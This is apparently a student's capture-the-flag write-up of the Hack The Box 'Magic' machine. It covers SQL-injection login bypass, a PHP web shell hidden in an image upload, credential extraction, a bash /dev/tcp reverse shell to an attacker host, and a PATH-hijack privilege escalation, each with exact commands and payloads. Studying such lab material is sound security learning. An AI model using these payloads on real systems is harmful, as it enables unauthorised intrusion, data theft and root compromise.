# HTB Magic — Learning Writeup & Post-Lab Reflection

> [!NOTE]
> This writeup documents my learning process while solving the HTB Magic machine. It includes my reasoning flow, mistakes, corrections, and concepts I had to revisit during the lab.

---

## 🖥️ Machine Information

*   **Machine Name:** Magic
*   **Platform:** Hack The Box
*   **Difficulty:** Medium

---

## ⛓️ General Attack Chain

```text
nmap scan
 └── web enumeration
      └── SQLi authentication bypass
           └── upload bypass
                └── gain RCE
                     └── enumerate OS
                          └── extract MySQL credentials
                               └── database dump
                                    └── credential reuse
                                         └── user pivot
                                              └── SUID enumeration
                                                   └── PATH hijack
                                                        └── root
```

---

## 🏁 Phase 1 — Port Scanning & Initial Enumeration

### **Nmap Scan**
I started the initial probe using the standard scanner tool:
```bash
nmap <target_ip>
```

The scan revealed only two active entry points:
*   **HTTP** (Port 80)
*   **SSH** (Port 22)

Since SSH required existing credentials or a public key, the HTTP service became my primary attack surface.

> [!IMPORTANT]
> **Key Networking Lesson:** `nmap` scans services that are externally reachable from the attacker machine over the network. Knowing the target IP alone is not enough; the attacker must also be actively connected to the correct lab network/VPN environment to route traffic successfully.

---

## 🔍 Phase 2 — Web Enumeration

I used **Burp Suite** to intercept and analyze HTTP traffic. Static directory endpoints did not expose any input fields:
*   `/images`
*   `/index.php`

Because these routes lacked entry points, I shifted my focus entirely to the web login page, which exposed two potential input vectors: **username** and **password**.

---

## 💉 Phase 3 — SQL Injection Discovery

### **Baseline Testing**
I first tested the fields with random credentials to establish a **false baseline** and observe structural application signals:
*   **Status Code:** `200`
*   **Response Length:** `4273`
*   **Response Body:** `"Wrong username or password"`

### **SQLi Testing**
Next, I injected standard logical operators against both fields separately:
*   `' AND 1=1--`
*   `' AND 1=2--`

Initially, all payloads produced identical responses:
*   **Status Code:** `200`
*   **Response Length:** `4221`
*   **Response Body:** *No error message displayed*

This variance in response length confirmed that the SQL syntax was altering the backend database logic, but my payload formatting was still breaking the query parser.

### **SQL Comment Syntax Correction**
I realized that MySQL comment syntax requires a trailing whitespace after the double-dash (`--`). 

*   **Incorrect:** `' OR 1=1--` (Becomes `--password=`, which fails to activate comment parsing)
*   **Correct:** `' OR 1=1-- -` 

The trailing space explicitly tells the database engine to drop the rest of the original query structure.

### **Authentication Bypass**
Applying the corrected syntax successfully forced a logical true condition, bypassed the login dashboard, and granted access to the internal file upload panel:
```sql
' OR 1=1-- -
```

---

## 📤 Phase 4 — Upload Bypass & PHP Execution

### **Upload Validation Testing**
The upload configuration explicitly restricted file types to: `JPG`, `JPEG`, and `PNG`. 

I first attempted to upload a blank file renamed to `test.jpg`, but the operation failed. This indicated that the server was validating file headers (magic bytes) rather than checking the extension alone.

### **Image + PHP Payload**
To circumvent this check, I appended a PHP execution string to the metadata structure of a valid image file and double-extended the name:
```bash
# Appending the payload to a legitimate image file
echo '<?php echo "HELLO"; ?>' >> legitimate_image.jpg
mv legitimate_image.jpg test.php.jpg
```

The server successfully accepted the file. 

> [!TIP]
> **Critical Distinction:** Upload validation success does **NOT** automatically mean code execution. The backend web server rules must still route that specific file structure to the runtime interpreter environment.

### **PHP Execution & RCE Validation**
When I requested the uploaded file directly, the web server processed it using its PHP handler rules. The embedded script executed and rendered `"HELLO"`.

To escalate this to **Remote Command Execution (RCE)**, I updated the payload to pass operating system instructions through an input parameter:
```php
<?php system($_GET['cmd']); ?>
```

Targeting the parameter verified that the system utility could pass internal instructions directly to the underlying Linux OS shell.

---

## 🕵️ Phase 5 — Enumeration as www-data

Using the live RCE vector, I audited the filesystem structure and found hardcoded application credentials located in the configuration directory:
*   **File Path:** `/var/www/Magic/db.php5`
*   **Extracted Credentials:** `theseus : iamkingtheseus`

---

## 📊 Phase 6 — Internal Service Discovery & Database Enumeration

> [!WARNING]
> **Avoid Faulty Assumptions:** I initially assumed that web dashboard credentials would automatically match local system or database root accounts. Web, database, and SSH systems maintain entirely separate authorization boundaries, even though developers frequently reuse secrets across them.

### **Internal Service Discovery**
I checked active local socket listeners from inside the target environment:
```bash
ss -lnt
```

The output revealed an active internal database port:
*   **Port:** `3306` (MySQL)

This highlighted an essential infrastructure concept: **External vs. Internal Visibility**. While `nmap` only flags externally exposed ports, internal auditing commands like `ss` display components bounded exclusively to the local loopback interface.

### **Database Dump**
I leveraged the native migration utility to print the schemas and table contents quickly:
```bash
mysqldump -u theseus -piamkingtheseus Magic
```

The resulting SQL script exposed cleartext administrative records:
*   **Admin Account:** `admin : Th3s3usW4sK1ng`

---

## 🐚 Phase 7 — Reverse Shell & User Pivot

### **One-Shot RCE Limitations**
I found that basic web-parameter RCE spawns an independent, non-persistent subprocess for each HTTP transaction. Environmental commands like changing directories do not persist:
```bash
# This change is lost as soon as the HTTP response returns
cd /tmp 
```

While structural file modifications persist across the filesystem, session variables and operational pathways disappear between requests.

### **Reverse Shell Establishment**
To stabilize connection state tracking, I set up a persistent netcat listener on my attacker machine:
```bash
nc -lnvp 1234
```

Then, I executed a network redirection string through the web entry point to force an active shell process back to my listener:
```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1'
```

### **PTY Upgrade**
Once connected, the raw stream lacked terminal control features. I upgraded the shell environment using Python's pseudo-terminal system and updated the terminal definition:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
This allowed terminal utilities like `su` or `vim` to process control sequences correctly.

### **User Pivot**
With a stable terminal, I pivoted from the service account to the local user context via credential reuse:
```bash
su theseus
# Password: Th3s3usW4sK1ng
```

---

## 👑 Phase 8 — Privilege Escalation

### **SUID Enumeration**
I searched the filesystem for binaries running with elevated root permissions (SUID bit set):
```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results, a custom binary located at `/bin/sysinfo` looked unusual. I ran a diagnostic trace on its execution flow:
```bash
strace -f /bin/sysinfo
```
The logs showed that `sysinfo` calls an external system tool named `lshw` **without specifying its absolute system path** (e.g., it calls `lshw` instead of `/usr/bin/lshw`).

### **PATH Hijack**
This functional oversight allowed me to execute a path interception attack. I manipulated the system search sequence to prioritize the temporary folder:
```bash
export PATH=/tmp:$PATH
```

Next, I wrote a malicious payload into `/tmp`, named it `lshw`, and granted it execution permissions:
```bash
echo '/bin/bash -p' > /tmp/lshw
chmod +x /tmp/lshw
```

When I executed the privileged `/bin/sysinfo` binary, it searched the modified `$PATH` environment variable, found my malicious script inside `/tmp` first, and executed it with root authority.

---

### 🧠 Deep-Dive Lessons Learned

#### 1. Network Visibility: External vs. Internal Scanning
*   **`nmap` (External):** Used to discover externally reachable services and open ports. It maps what a remote attacker can see and interact with over the network.
*   **`ss` / `netstat` (Internal):** Used locally on the compromised machine to list all active network connections and listening sockets. It reveals internal-only services (like a database bound to `127.0.0.1:3306`) that are shielded from external `nmap` scans.

#### 2. Process-Local State & Filesystem Persistence
When executing commands via an web-based Remote Command Execution (RCE) vulnerability, each request triggers a separate, short-lived operating system process:
*   **Isolated Environments:** Every time a one-shot RCE payload is sent, the web server spawns a brand new process. This process always initializes from the web server's default working directory (e.g., `/var/www/magic/images`).
*   **Process Lifecycle Examples:**
    *   **Payload A (`cd /var/www/magic`):** Spawns Process A $\rightarrow$ starts in `/var/www/magic/images` $\rightarrow$ changes directory to `/var/www/magic` $\rightarrow$ Process A exits. The directory change is lost.
    *   **Payload B (`cd /var/www/magic && ls -lah`):** Spawns Process B $\rightarrow$ starts in `/var/www/magic/images` $\rightarrow$ changes directory to `/var/www/magic` $\rightarrow$ lists files $\rightarrow$ Process B exits.
    *   **Payload C (`cd /var/www/magic && touch test`):** Spawns Process C $\rightarrow$ starts in `/var/www/magic/images` $\rightarrow$ changes directory to `/var/www/magic` $\rightarrow$ creates the file `test` $\rightarrow$ Process C exits.
*   **Filesystem vs. Process State:** While process states (like current working directories or environment variables) disappear when a process exits, filesystem modifications are persistent. The operating system does not "forget" structural changes; therefore, the `test` file remains on disk long after Process C terminates.

#### 3. Execution Layers: PHP Interpreter vs. System Calls
*   **The Interpreter Layer:** After a file bypasses upload filters, the web server evaluates its extension. If configured to do so, it routes the file to the PHP interpreter. Code like `<?php echo "HELLO"; ?>` is processed entirely within the runtime environment of the PHP engine, which outputs the text back to the server response.
*   **The OS Layer via `system()`:** If the code contains a system execution function like `system()`, `exec()`, or `passthru()`, the PHP interpreter breaks out of its application sandbox. It requests the underlying operating system to spawn a shell (typically `/bin/sh`) and execute the raw Linux commands passed inside the function's arguments.

#### 4. Mechanics of a Reverse Shell Payload
A reverse shell changes the communication flow from unstable, stateless HTTP requests to a continuous, interactive session:
*   **The Listener:** The attacker first sets up a local network listener using Netcat: `nc -lnvp <port_number>`.
*   **The Redirection Payload:** The attacker triggers a payload on the target, such as:
    ```bash
    bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port_number> 0>&1'
    ```
*   **Data Stream Breakdown:**
    *   `bash -i`: Spawns an interactive shell instance on the target.
    *   `>& /dev/tcp/...`: Redirects the standard output (`stdout`) and standard error (`stderr`) streams of that shell across a TCP connection back to the attacker's listening machine.
    *   `0>&1`: Ties standard input (`stdin`) to the exact same TCP socket descriptor. This ensures that any keystrokes typed into the attacker's terminal travel forward through the network stream to feed directly into the target's shell input.
*   **Persistence:** Because this network socket connection and its associated shell process remain active, the attacker can execute commands interactively without generating new HTTP request/response loops.

#### 5. Interactive Upgrades using Pseudo-Terminals (PTY)
*   **Raw Connection Constraints:** Standard reverse shells run over raw network streams and lack standard terminal features. Interactive programs (like `su`, `ssh`, or `vim`) will fail because they require a controlling terminal interface to enter passwords or draw text UI elements.
*   **The PTY Fix:** Running the following Python wrapper simulates a valid terminal interface in software:
    ```python
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    This tricks the operating system into treating the network socket connection like a physical terminal device, granting full interactive software compatibility.

#### 6. Vulnerabilities vs. Post-Exploitation Mechanics
*   **The Transport Channel:** A reverse shell is **not** a security vulnerability. It is merely a post-exploitation transport mechanism—a network connection that forwards terminal inputs and outputs across a persistent network channel.
*   **The Root Flaw:** The actual security vulnerability on this machine is Remote Command Execution (RCE), driven by insufficient file upload validation and poor input sanitation. This structural weakness allowed arbitrary text files containing executable backend scripts to enter the web root and get parsed by the language engine.


---

## ⚠️ Identified Personal Weaknesses
*   Shallow or weak initial networking context
*   Over-reliance on HTTP content length variations
*   Debugging issues at the wrong environmental layer
*   Imprecise or unstable exploit syntax formatting
*   Heavy payload dependencies
*   Misunderstanding shell tracking states
*   Making premature architectural assumptions

---

